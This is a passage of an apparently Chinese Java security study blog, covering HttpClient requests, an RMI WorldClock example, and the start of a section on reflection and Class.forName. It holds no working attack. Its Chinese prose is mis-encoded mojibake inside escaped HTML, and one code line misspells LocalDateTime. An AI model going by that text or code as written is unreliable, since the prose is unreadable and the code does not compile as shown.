&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">header&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">keySet&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">header&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">header&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">1024&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>post&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://www.example.com/login&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;username=bob&amp;amp;password=123456&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">HttpRequest&lt;/span> &lt;span style="color:#111">request&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newBuilder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è®¾ç½®Header:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/*&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è®¾ç½®è¶…æ—¶:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Duration&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofSeconds&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">5&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è®¾ç½®ç‰ˆæœ¬:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">version&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Version&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">HTTP_2&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ä½¿ç”¨POSTå¹¶è®¾ç½®Body:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">POST&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">BodyPublishers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">body&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">HttpResponse&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">httpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">HttpResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">BodyHandlers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="rmi">RMI&lt;/h3>
&lt;p>ä¸€ä¸ªJVMä¸­çš„ä»£ç å¯ä»¥é€šè¿‡ç½‘ç»œå®ç°è¿œç¨‹è°ƒç”¨å¦ä¸€ä¸ªJVMçš„æŸä¸ªæ–¹æ³•&lt;/p>
&lt;p>è¦å®ç°RMIï¼ŒæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å¿…é¡»å…±äº«åŒä¸€ä¸ªæ¥å£interfaceï¼Œæµ‹è¯•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">WorldClock&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Remote&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LocalDateTime&lt;/span> &lt;span style="color:#75af00">getLocalDateTime&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">zoneId&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ­¤æ¥å£å¿…é¡»æ´¾ç”Ÿè‡ª&lt;code>java.rmi.Remote&lt;/code>ï¼Œå¹¶åœ¨æ¯ä¸ªæ–¹æ³•å£°æ˜æŠ›å‡º&lt;code>RemoteException&lt;/code>&lt;/p>
&lt;p>ä¸‹ä¸€æ­¥æ˜¯ç¼–å†™æœåŠ¡å™¨çš„å®ç°ç±»ï¼Œå› ä¸ºå®¢æˆ·ç«¯è¯·æ±‚çš„è°ƒç”¨æ–¹æ³•&lt;code>getLocalDateTime()&lt;/code>æœ€ç»ˆä¼šé€šè¿‡è¿™ä¸ªå®ç°ç±»è¿”å›ç»“æœ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">WorldClockService&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">WorldClock&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">LocalDataTime&lt;/span> &lt;span style="color:#75af00">getLocalDateTime&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">zoneId&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">LocalDataTime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">now&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ZoneId&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">zoneId&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">withNano&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç°åœ¨éœ€è¦é€šè¿‡Java RMIæä¾›çš„ä¸€ç³»åˆ—åº•å±‚æ”¯æŒæ¥å£ï¼ŒæŠŠä¸Šé¢ç¼–å†™çš„æœåŠ¡ä»¥RMIçš„å½¢å¼æš´éœ²åœ¨ç½‘ç»œä¸Šï¼Œå®¢æˆ·ç«¯æ‰èƒ½è°ƒç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Server&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;create World clock remote service...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å®ä¾‹åŒ–ä¸€ä¸ªWorldClock:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">WorldClock&lt;/span> &lt;span style="color:#111">worldClock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">WorldClockService&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å°†æ­¤æœåŠ¡è½¬æ¢ä¸ºè¿œç¨‹æœåŠ¡æ¥å£:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">WorldClock&lt;/span> &lt;span style="color:#111">skeleton&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">WorldClock&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">UnicastRemoteObject&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">exportObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">worldClock&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å°†RMIæœåŠ¡æ³¨å†Œåˆ°1099ç«¯å£:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Registry&lt;/span> &lt;span style="color:#111">registry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1099&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// æ³¨å†Œæ­¤æœåŠ¡ï¼ŒæœåŠ¡åä¸º&amp;#34;WorldClock&amp;#34;:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">registry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">rebind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;WorldClock&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">skeleton&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç”±äºRMIè¦æ±‚æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å…±äº«åŒä¸€ä¸ªæ¥å£ï¼Œå› æ­¤æˆ‘ä»¬è¦æŠŠ&lt;code>WorldClock.java&lt;/code>è¿™ä¸ªæ¥å£æ–‡ä»¶å¤åˆ¶åˆ°å®¢æˆ·ç«¯ï¼Œç„¶ååœ¨å®¢æˆ·ç«¯å®ç°RMIè°ƒç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Client&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">NotBoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è¿æ¥åˆ°æœåŠ¡å™¨localhostï¼Œç«¯å£1099:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Registry&lt;/span> &lt;span style="color:#111">registry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">1099&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// æŸ¥æ‰¾åç§°ä¸º&amp;#34;WorldClock&amp;#34;çš„æœåŠ¡å¹¶å¼ºåˆ¶è½¬å‹ä¸ºWorldClockæ¥å£:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">WorldClock&lt;/span> &lt;span style="color:#111">worldClock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">WorldClock&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">registry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;WorldClock&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// æ­£å¸¸è°ƒç”¨æ¥å£æ–¹æ³•:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">LocalDateTime&lt;/span> &lt;span style="color:#111">now&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">worldClock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLocalDateTime&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Asia/Shanghai&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// æ‰“å°è°ƒç”¨ç»“æœ:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">now&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯¹å®¢æˆ·ç«¯æ¥è¯´ï¼Œå®¢æˆ·ç«¯æŒæœ‰çš„&lt;code>WorldClock&lt;/code>æ¥å£å®é™…ä¸Šå¯¹åº”äº†ä¸€ä¸ªâ€œå®ç°ç±»â€ï¼Œå®ƒæ˜¯ç”±&lt;code>Registry&lt;/code>å†…éƒ¨åŠ¨æ€ç”Ÿæˆçš„ï¼Œå¹¶è´Ÿè´£æŠŠæ–¹æ³•è°ƒç”¨é€šè¿‡ç½‘ç»œä¼ é€’åˆ°æœåŠ¡å™¨ç«¯ã€‚è€ŒæœåŠ¡å™¨ç«¯æ¥æ”¶ç½‘ç»œè°ƒç”¨çš„æœåŠ¡å¹¶ä¸æ˜¯æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„&lt;code>WorldClockService&lt;/code>ï¼Œè€Œæ˜¯&lt;code>Registry&lt;/code>è‡ªåŠ¨ç”Ÿæˆçš„ä»£ç ã€‚æˆ‘ä»¬æŠŠå®¢æˆ·ç«¯çš„â€œå®ç°ç±»â€ç§°ä¸º&lt;code>stub&lt;/code>ï¼Œè€ŒæœåŠ¡å™¨ç«¯çš„ç½‘ç»œæœåŠ¡ç±»ç§°ä¸º&lt;code>skeleton&lt;/code>ï¼Œå®ƒä¼šçœŸæ­£è°ƒç”¨æœåŠ¡å™¨ç«¯çš„&lt;code>WorldClockService&lt;/code>ï¼Œè·å–ç»“æœï¼Œç„¶åæŠŠç»“æœé€šè¿‡ç½‘ç»œä¼ é€’ç»™å®¢æˆ·ç«¯&lt;/p>
&lt;p>RMIé€šè¿‡è‡ªåŠ¨ç”Ÿæˆstubå’Œskeletonå®ç°ç½‘ç»œè°ƒç”¨ï¼Œå®¢æˆ·ç«¯åªéœ€è¦æŸ¥æ‰¾æœåŠ¡å¹¶è·å¾—æ¥å£å®ä¾‹ï¼ŒæœåŠ¡å™¨ç«¯åªéœ€è¦ç¼–å†™å®ç°ç±»å¹¶æ³¨å†Œä¸ºæœåŠ¡&lt;/p>
&lt;p>æ•´ä¸ªè¿‡ç¨‹ç”±RMIåº•å±‚è´Ÿè´£å®ç°åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå¾ˆå®¹æ˜“äº§ç”Ÿå®‰å…¨é—®é¢˜&lt;/p>
&lt;h2 id="åå°„å®‰å…¨">åå°„å®‰å…¨&lt;/h2>
&lt;p>å…³äºåå°„ï¼Œpç‰›ç»™å‡ºäº†è¿™æ ·çš„å®šä¹‰&lt;/p>
&lt;blockquote>
&lt;p>ä¸€æ®µä»£ç ï¼Œæ”¹å˜å…¶ä¸­çš„å˜é‡ï¼Œå°†ä¼šå¯¼è‡´è¿™æ®µä»£ç äº§ç”ŸåŠŸèƒ½æ€§çš„å˜åŒ–&lt;/p>
&lt;/blockquote>
&lt;p>å¯ä»¥è”æƒ³åˆ°PHPçš„ä¸€å¥è¯ğŸ&lt;/p>
&lt;h3 id="forname">forName&lt;/h3>
&lt;p>è·å–ä¸€ä¸ª&lt;code>class&lt;/code>çš„&lt;code>Class&lt;/code>å®ä¾‹çš„æ–¹å¼ä¹‹ä¸€æ˜¯&lt;code>Class.forName&lt;/code>ï¼Œå®ƒæœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#75715e">// å¸¸ç”¨
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span>&lt;span style="color:#f92672">**&lt;/span> &lt;span style="color:#111">initialize&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassLoader&lt;/span> &lt;span style="color:#111">loader&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¬¬ä¸‰ä¸ªå‚æ•°&lt;code>ClassLoader&lt;/code>çš„ä½œç”¨æ˜¯å‘Šè¯‰JVMå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ï¼Œjavaé»˜è®¤çš„&lt;code>ClassLoader&lt;/code>å°±æ˜¯æ ¹æ®ç±»åï¼ˆç±»å®Œæ•´è·¯å¾„ï¼‰æ¥åŠ è½½ç±»&lt;/p>
&lt;p>å¯¹äºç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ä½¿æˆ‘ä»¬è®¾ç½®&lt;code>true&lt;/code>ï¼Œä¹Ÿä¸ä¼šåœ¨æ‰§è¡Œ&lt;code>forName&lt;/code>æ—¶æ‰§è¡Œæ„é€ å‡½æ•°ï¼Œè¿™é‡Œçš„&lt;code>initialize&lt;/code>æŒ‡çš„æ˜¯ç±»çš„åˆå§‹åŒ–ï¼Œè°ƒç”¨å…¶ä¸­çš„&lt;code>static&lt;/code>éƒ¨åˆ†ä»£ç &lt;/p>
&lt;ul>
&lt;li>
&lt;p>ç±»çš„å®ä¾‹åŒ–ï¼šstatic{} -&amp;gt; {} -&amp;gt; æ„é€ å‡½æ•°&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç±»çš„åˆå§‹åŒ–ï¼šstatic{}&lt;/p>
&lt;/li>
&lt;/ul>
